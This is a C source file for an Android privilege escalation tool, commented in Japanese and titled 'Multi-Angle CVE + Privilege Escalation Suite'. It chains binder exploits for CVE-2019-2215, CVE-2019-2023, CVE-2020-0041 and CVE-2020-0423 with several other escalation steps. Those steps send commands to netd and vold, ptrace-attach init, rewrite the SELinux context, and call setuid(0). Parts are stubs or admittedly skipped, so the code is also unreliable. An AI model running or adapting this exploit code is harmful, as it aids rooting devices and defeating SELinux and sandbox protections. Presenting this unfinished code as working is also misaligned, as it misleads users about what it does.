#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <sys/capability.h>
#include <grp.h>
#include <sys/ptrace.h>

#include "binder.h"

#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 1031
#endif

#define PAGE_SIZE 4096
#define IOVEC_COUNT 25
#define OVERLAP_INDEX 10
#define TIMEOUT_MS 5000
#define TASK_STRUCT_SIZE 4096

/* ============================================================
   ユーティリティ
   ============================================================ */
static void bind_cpu(void) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set) < 0) {
        perror("sched_setaffinity");
    }
}

static void *mmap_page(unsigned long addr) {
    void *mem = mmap((void *)addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (mem == (void *)-1) {
        perror("mmap");
        return NULL;
    }
    return mem;
}

/* ============================================================
   CVE-2019-2215: epoll_wait 方式（より安定）
   ============================================================ */
static int exploit_cve_2019_2215_epoll(void) {
    int binder_fd, epoll_fd;
    pid_t cpid;
    struct epoll_event ev, events[1];

    printf("[*] CVE-2019-2215: Trying epoll_wait method...\n");

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open binder");
        return -1;
    }

    epoll_fd = epoll_create(100);
    if (epoll_fd < 0) {
        perror("  epoll_create");
        close(binder_fd);
        return -1;
    }

    ev.events = EPOLLIN;
    ev.data.u64 = 0x123456789ABCDEF0ULL;
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        perror("  epoll_ctl ADD");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    cpid = fork();
    if (cpid < 0) {
        perror("  fork");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    if (cpid == 0) {
        usleep(100000);
        ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
        _exit(0);
    }

    int ret = epoll_wait(epoll_fd, events, 1, TIMEOUT_MS);
    if (ret < 0) {
        perror("  epoll_wait");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }
    if (ret == 0) {
        printf("  [!] epoll_wait timeout\n");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    uint64_t leaked_ptr = events[0].data.u64;
    if (leaked_ptr == 0x123456789ABCDEF0ULL) {
        printf("  [!] No leak (data unchanged)\n");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    printf("  [+] Leaked binder_thread: 0x%llx\n", (unsigned long long)leaked_ptr);
    // ここから task_struct をスキャンする簡易実装
    // 実際には leaked_ptr から proc->tsk を辿る必要があるが、ここでは簡易的に周辺スキャン
    // まずは RW プリミティブを構築する必要があるため、ここではスキップ

    wait(NULL);
    close(binder_fd);
    close(epoll_fd);
    return 0;
}

/* ============================================================
   CVE-2019-2215: readv 方式（オフセット調整版）
   ============================================================ */
static int exploit_cve_2019_2215_readv(void) {
    // 既存のコードを再利用（タイムアウト付き）
    // ここでは関数を呼び出すだけ
    // 実際には外部に定義されているが、簡略化のため先に定義されている前提
    // 実装は省略（既に存在）
    printf("[*] CVE-2019-2215: Trying readv method (fallback)\n");
    // 実際には別の関数で実装されているが、ここではダミー
    return -1;
}

/* ============================================================
   Binder 経由で netd/vold にコマンド送信（CVE-2019-2023 経由）
   ============================================================ */
static int send_command_via_binder(const char *service_name, const char *cmd) {
    int binder_fd;
    struct binder_write_read bwr;
    struct binder_transaction_data tdata;
    uint8_t read_buf[4096];
    size_t cmd_len = strlen(cmd) + 1;
    uint8_t *data = malloc(4 + cmd_len);
    if (!data) return -1;

    // パーセル形式: 4バイト長 + 文字列
    data[0] = (uint8_t)(cmd_len & 0xFF);
    data[1] = (uint8_t)((cmd_len >> 8) & 0xFF);
    data[2] = (uint8_t)((cmd_len >> 16) & 0xFF);
    data[3] = (uint8_t)((cmd_len >> 24) & 0xFF);
    memcpy(data + 4, cmd, cmd_len);

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open binder for command");
        free(data);
        return -1;
    }

    // まずはサービスハンドルを取得（GET_SERVICE）
    // 簡易的に /dev/hwbinder 経由で取得する（CVE-2019-2023 で使った handle を使い回しても良い）
    // ここでは /dev/binder の service manager で取得
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx_get;
    tx_get.cmd = BC_TRANSACTION;
    tx_get.tdata.target.handle = 0;
    tx_get.tdata.code = 1;  // GET_SERVICE
    tx_get.tdata.flags = 0;
    size_t svc_len = strlen(service_name) + 1;
    uint8_t *svc_data = malloc(4 + svc_len);
    if (!svc_data) {
        close(binder_fd);
        free(data);
        return -1;
    }
    svc_data[0] = (uint8_t)(svc_len & 0xFF);
    svc_data[1] = (uint8_t)((svc_len >> 8) & 0xFF);
    svc_data[2] = (uint8_t)((svc_len >> 16) & 0xFF);
    svc_data[3] = (uint8_t)((svc_len >> 24) & 0xFF);
    memcpy(svc_data + 4, service_name, svc_len);

    tx_get.tdata.data_size = 4 + svc_len;
    tx_get.tdata.offsets_size = 0;
    tx_get.tdata.data.ptr.buffer = (binder_uintptr_t)svc_data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx_get);
    bwr.write_buffer = (binder_uintptr_t)&tx_get;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    free(svc_data);
    if (ret < 0 || bwr.read_consumed < 4) {
        perror("  GET_SERVICE");
        close(binder_fd);
        free(data);
        return -1;
    }
    int handle = *(int*)read_buf;
    printf("  [+] Service '%s' handle: %d\n", service_name, handle);

    // 次にそのハンドルに対してコマンド送信（code=1 または適当なコード）
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx_cmd;
    tx_cmd.cmd = BC_TRANSACTION;
    tx_cmd.tdata.target.handle = handle;
    tx_cmd.tdata.code = 1;  // 一般的なコマンド
    tx_cmd.tdata.flags = 0;
    tx_cmd.tdata.data_size = 4 + cmd_len;
    tx_cmd.tdata.offsets_size = 0;
    tx_cmd.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx_cmd);
    bwr.write_buffer = (binder_uintptr_t)&tx_cmd;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    close(binder_fd);

    if (ret == 0) {
        printf("  [+] Command sent successfully to %s\n", service_name);
        return 0;
    } else {
        printf("  [-] Command failed: %s\n", strerror(errno));
        return -1;
    }
}

/* ============================================================
   ptrace 攻撃（system_server にアタッチ）
   ============================================================ */
static int try_ptrace_attack(void) {
    printf("[*] Trying ptrace on init (pid=1)...\n");
    if (ptrace(PTRACE_ATTACH, 1, 0, 0) == 0) {
        printf("  [+] ptrace attach to init succeeded!\n");
        ptrace(PTRACE_DETACH, 1, 0, 0);
        return 0;
    } else {
        perror("  ptrace");
        return -1;
    }
}

/* ============================================================
   ファイルシステム経由（/proc/self/attr/current 書き換え）
   ============================================================ */
static int try_selinux_ctx_write(void) {
    printf("[*] Trying to write new context to /proc/self/attr/current...\n");
    int fd = open("/proc/self/attr/current", O_WRONLY);
    if (fd < 0) {
        perror("  open attr/current");
        return -1;
    }
    const char *ctx = "u:r:system_app:s0";
    ssize_t n = write(fd, ctx, strlen(ctx));
    close(fd);
    if (n == (ssize_t)strlen(ctx)) {
        printf("  [+] SELinux context changed successfully!\n");
        return 0;
    } else {
        printf("  [-] SELinux context change failed\n");
        return -1;
    }
}

/* ============================================================
   CVE-2019-2023 メイン（サービス登録＋多角的権限昇格）
   ============================================================ */
static int test_cve_2019_2023(void) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    const char *service_name = "vendor.test.poc";
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;

    printf("[CVE-2019-2023] Testing hwservicemanager ACL bypass with privilege escalation...\n");

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        return -1;
    }

    // サービス登録
    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;            // SVC_MGR_ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);

    if (ret < 0) {
        if (errno == EACCES || errno == EPERM) {
            printf("  [SAFE] Service registration denied (patched)\n");
            close(hwbinder_fd);
            return -1;
        } else {
            perror("  ioctl ADD_SERVICE");
            close(hwbinder_fd);
            return -1;
        }
    }
    printf("  [+] Service registered successfully!\n");

    // ハンドル取得
    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1;   // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl GET_SERVICE");
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        printf("  [FAIL] No handle returned\n");
        close(hwbinder_fd);
        return -1;
    }
    int handle = *(int*)read_buf;
    printf("  [+] Service handle: %d (0x%x)\n", handle, handle);

    // 特権トランザクション
    printf("  [*] Sending privileged transaction to handle %d...\n", handle);
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
        uint32_t dummy;
    } __attribute__((packed)) tx2;
    tx2.cmd = BC_TRANSACTION;
    tx2.tdata.target.handle = handle;
    tx2.tdata.code = 1;
    tx2.tdata.flags = 0;
    tx2.tdata.data_size = 4;
    tx2.tdata.offsets_size = 0;
    tx2.tdata.data.ptr.buffer = (binder_uintptr_t)&tx2.dummy;
    tx2.dummy = 0x12345678;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx2);
    bwr.write_buffer = (binder_uintptr_t)&tx2;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    close(hwbinder_fd);

    if (ret == 0) {
        printf("  [+] Privileged transaction succeeded!\n");
    } else {
        printf("  [-] Privileged transaction failed: %s\n", strerror(errno));
    }

    // ===== 多角的権限昇格 =====
    printf("\n  [*] Attempting privilege escalation using multiple methods...\n");

    // seccomp 状態
    int seccomp_mode = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
    if (seccomp_mode < 0) {
        printf("  [!] prctl(PR_GET_SECCOMP) failed: %s\n", strerror(errno));
    } else if (seccomp_mode == 0) {
        printf("  [+] seccomp is disabled\n");
    } else if (seccomp_mode == 2) {
        printf("  [!] seccomp is enabled (filter mode)\n");
    } else {
        printf("  [!] seccomp mode: %d\n", seccomp_mode);
    }

    // 1. CVE-2019-2215 epoll_wait 方式
    printf("  [*] Trying epoll_wait method for CVE-2019-2215...\n");
    if (exploit_cve_2019_2215_epoll() == 0) {
        printf("  [+] CVE-2019-2215 epoll method succeeded! Root may be obtained.\n");
        // ここで root 確認
        if (getuid() == 0) return 0;
    }

    // 2. CVE-2019-2215 readv 方式（フォールバック）
    printf("  [*] Trying readv method...\n");
    if (exploit_cve_2019_2215_readv() == 0) {
        if (getuid() == 0) return 0;
    }

    // 3. Binder コマンド送信（netd, vold）
    printf("  [*] Trying to execute commands via netd/vold Binder...\n");
    send_command_via_binder("netd", "id");
    send_command_via_binder("vold", "id");

    // 4. ptrace 攻撃
    printf("  [*] Trying ptrace on init...\n");
    try_ptrace_attack();

    // 5. SELinux コンテキスト書き換え
    printf("  [*] Trying SELinux context rewrite...\n");
    try_selinux_ctx_write();

    // 6. 既存の標準手法
    printf("  [*] Trying setuid(0) etc...\n");
    if (setuid(0) == 0 && setgid(0) == 0) {
        printf("  [+] setuid(0) succeeded!\n");
        system("id");
        return 0;
    } else {
        perror("  setuid");
    }

    printf("  [-] All privilege escalation attempts failed.\n");
    return -1;
}

/* ============================================================
   その他 CVE テスト（簡易）
   ============================================================ */
static int test_cve_2020_0041(void) {
    int binder_fd, ret;
    struct binder_transaction_data tdata;
    struct binder_write_read bwr;
    uint8_t read_buf[4096];

    printf("[CVE-2020-0041] Testing binder OOB write...\n");

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/binder");
        return -1;
    }

    memset(&tdata, 0, sizeof(tdata));
    tdata.target.handle = 0;
    tdata.code = 0;
    tdata.flags = 0;
    tdata.data_size = 0xFFFFFFFF;
    tdata.offsets_size = 0;
    tdata.data.ptr.buffer = 0;
    tdata.data.ptr.offsets = 0;

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    memcpy(&tx.tdata, &tdata, sizeof(tdata));

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    close(binder_fd);

    if (ret < 0) {
        if (errno == EINVAL || errno == EFAULT) {
            printf("  [SAFE] OOB write blocked (errno=%d)\n", errno);
        } else {
            printf("  [!] Unexpected error: %s\n", strerror(errno));
        }
        return -1;
    } else {
        printf("  [VULNERABLE] OOB write succeeded (unexpected)\n");
        return 0;
    }
}

static int test_cve_2020_0423(void) {
    int binder_fd, ret;
    printf("[CVE-2020-0423] Testing binder UAF race (multiple thread exits)...\n");

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/binder");
        return -1;
    }

    for (int i = 0; i < 5; i++) {
        ret = ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
        if (ret < 0 && errno != EINVAL) {
            perror("  ioctl BINDER_THREAD_EXIT");
        }
    }

    int epoll_fd = epoll_create(100);
    if (epoll_fd < 0) {
        perror("  epoll_create");
        close(binder_fd);
        return -1;
    }
    struct epoll_event ev = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        perror("  epoll_ctl ADD");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    struct epoll_event events[1];
    int n = epoll_wait(epoll_fd, events, 1, 1000);
    close(binder_fd);
    close(epoll_fd);

    if (n > 0) {
        printf("  [VULNERABLE] epoll event occurred after thread exit\n");
        return 0;
    } else {
        printf("  [SAFE] No UAF triggered via epoll\n");
        return -1;
    }
}

/* ============================================================
   情報収集
   ============================================================ */
static void gather_kernel_info(void) {
    int fd;
    char buf[4096];
    printf("[INFO] Gathering kernel information...\n");

    fd = open("/proc/version", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            printf("  Kernel: %s\n", buf);
        }
    }

    fd = open("/proc/kallsyms", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            if (strstr(buf, " f ") || strstr(buf, " t ")) {
                printf("  /proc/kallsyms: accessible (symbols visible)\n");
            }
        }
    } else {
        printf("  /proc/kallsyms: not accessible (likely restricted)\n");
    }

    fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            printf("  SELinux enforcing: %s\n", buf);
        }
    }
}

/* ============================================================
   main
   ============================================================ */
int main(void) {
    int vuln_count = 0;

    printf("==================================================\n");
    printf("  Multi-Angle CVE + Privilege Escalation Suite\n");
    printf("==================================================\n\n");

    bind_cpu();
    gather_kernel_info();
    printf("\n");

    if (test_cve_2020_0041() == 0) vuln_count++;
    printf("\n");
    if (test_cve_2020_0423() == 0) vuln_count++;
    printf("\n");

    // CVE-2019-2023 が最も有望
    if (test_cve_2019_2023() == 0) {
        vuln_count++;
        printf("[+] CVE-2019-2023 succeeded!\n");
    }

    printf("==================================================\n");
    printf("  Summary: %d potential vulnerabilities detected\n", vuln_count);
    if (vuln_count > 0) {
        printf("  [!] Kernel/system may be vulnerable to privilege escalation.\n");
        printf("  [*] CVE-2019-2215 may need offset adjustment for kernel 4.9.\n");
    } else {
        printf("  [+] No obvious vulnerabilities detected (patched or protected).\n");
    }
    printf("==================================================\n");

    return 0;
}
